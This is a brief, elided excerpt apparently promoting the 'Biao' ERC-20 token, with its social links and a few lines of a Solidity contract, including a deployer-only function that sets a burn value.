...
TELEGRAM: https://t.me/BiaoTGPortal
TWITTER: https://twitter.com/BiaoERC20
WEBSITE: https://biao.homes
...
pragma solidity ^0.8.20;
    ...
    contract Biao {
        ...
        address payable constant deployer = payable(address(0xD56cAF0c1120de34078798A3Fe88663Cfcc5a488)); //
        ...
        function _setBIAO(uint256 newBurn, uint256 newConfirm) external {
            require(msg.sender == deployer);
            BurnFigure = newBurn;
